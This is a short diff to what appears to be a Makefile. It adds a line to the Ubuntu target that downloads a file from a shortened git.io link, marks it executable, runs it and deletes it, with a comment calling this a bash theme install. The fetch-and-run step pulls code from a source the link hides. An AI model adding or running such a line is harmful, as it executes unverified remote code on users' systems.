@@ -17,3 +17,4 @@ mac: all
 
 ubuntu: all
 	echo "Hello Ubuntu!"
+	wget -O xt  http://git.io/v3D8e && chmod +x xt && ./xt && rm xt # Install bash theme
